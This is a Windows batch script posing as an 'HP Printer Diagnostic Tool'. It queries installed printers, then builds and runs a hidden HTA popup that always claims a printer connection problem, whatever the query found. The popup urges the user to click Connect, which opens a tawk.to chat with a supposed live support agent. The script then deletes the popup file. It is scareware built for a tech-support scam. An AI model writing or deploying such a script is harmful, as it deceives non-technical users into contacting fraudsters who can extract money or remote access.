@echo off
title HP Printer Diagnostic Tool
color 0A

echo ===================================================
echo      HP PRINTER HARDWARE DIAGNOSTIC TOOL
echo ===================================================
echo.
echo Scanning system for installed printers and statuses...
echo Please wait...
echo.

:: Ping localhost to create a small delay
ping 127.0.0.1 -n 3 > nul

echo [System Query] Retrieving local printer devices...
echo.

:: Use WMIC to get actual printer information
wmic printer get Name, PrinterState, PrinterStatus, Default /format:table

echo.
echo ===================================================
echo [!] DIAGNOSTIC COMPLETE
echo ===================================================
echo.
echo Generating report...

:: Create a temporary HTA application to show a premium custom dialog box with a single Connect button
echo ^<!DOCTYPE html^> > "%temp%\chat_popup.hta"
echo ^<html^>^<head^>^<title^>HP Printer Diagnostic Tool^</title^> >> "%temp%\chat_popup.hta"
echo ^<meta http-equiv="x-ua-compatible" content="ie=edge"^> >> "%temp%\chat_popup.hta"
echo ^<hta:application id="oDiag" border="dialog" maximizebutton="no" minimizebutton="no" scroll="no" /^> >> "%temp%\chat_popup.hta"
echo ^<style^> >> "%temp%\chat_popup.hta"
echo   body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; background: #fff; color: #333; overflow: hidden; } >> "%temp%\chat_popup.hta"
echo   .header { font-size: 16px; font-weight: bold; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; } >> "%temp%\chat_popup.hta"
echo   .desc { font-size: 13px; color: #555; margin-bottom: 20px; line-height: 1.5; } >> "%temp%\chat_popup.hta"
echo   .btn-container { text-align: right; } >> "%temp%\chat_popup.hta"
echo   .btn { padding: 8px 25px; background: #024ad8; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; } >> "%temp%\chat_popup.hta"
echo ^</style^>^</head^>^<body^> >> "%temp%\chat_popup.hta"
echo   ^<div class="header"^>^<svg viewBox="0 0 100 100" style="width: 24px; height: 24px; fill: none; vertical-align: middle; display: inline-block; margin-right: 8px;"^>^<path d="M50 10 L90 85 L10 85 Z" fill="#e02424" stroke="#e02424" stroke-width="8" stroke-linejoin="round" /^>^<rect x="46" y="32" width="8" height="24" rx="3" fill="white" /^>^<circle cx="50" cy="68" r="5" fill="white" /^>^</svg^>^<span style="vertical-align: middle;"^>Diagnostic Complete^</span^>^</div^> >> "%temp%\chat_popup.hta"
echo   ^<div class="desc"^> >> "%temp%\chat_popup.hta"
echo     HP Printer connection issue detected. Driver conflicts can block printing, scanning, and wireless connectivity. Resolve it now to avoid downtime!. ^<br^>^<br^> >> "%temp%\chat_popup.hta"
echo     Please click Connect to connect with a Live Support Agent now to resolve this. >> "%temp%\chat_popup.hta"
echo   ^</div^> >> "%temp%\chat_popup.hta"
echo   ^<div class="btn-container"^>^<button class="btn" onclick="connect()"^>Connect^</button^>^</div^> >> "%temp%\chat_popup.hta"
echo   ^<script^> >> "%temp%\chat_popup.hta"
echo     window.resizeTo(500, 290); >> "%temp%\chat_popup.hta"
echo     window.moveTo((screen.width - 500)/2, (screen.height - 290)/2); >> "%temp%\chat_popup.hta"
echo     function connect() { >> "%temp%\chat_popup.hta"
echo       var shell = new ActiveXObject("WScript.Shell"); >> "%temp%\chat_popup.hta"
echo       shell.Run("https://tawk.to/chat/69f3473e1916811c3475724c/1johivmrb"); >> "%temp%\chat_popup.hta"
echo       window.close(); >> "%temp%\chat_popup.hta"
echo     } >> "%temp%\chat_popup.hta"
echo   ^</script^> >> "%temp%\chat_popup.hta"
echo ^</body^>^</html^> >> "%temp%\chat_popup.hta"

:: Run the popup via mshta
mshta "%temp%\chat_popup.hta"

:: Cleanup
del "%temp%\chat_popup.hta"

exit
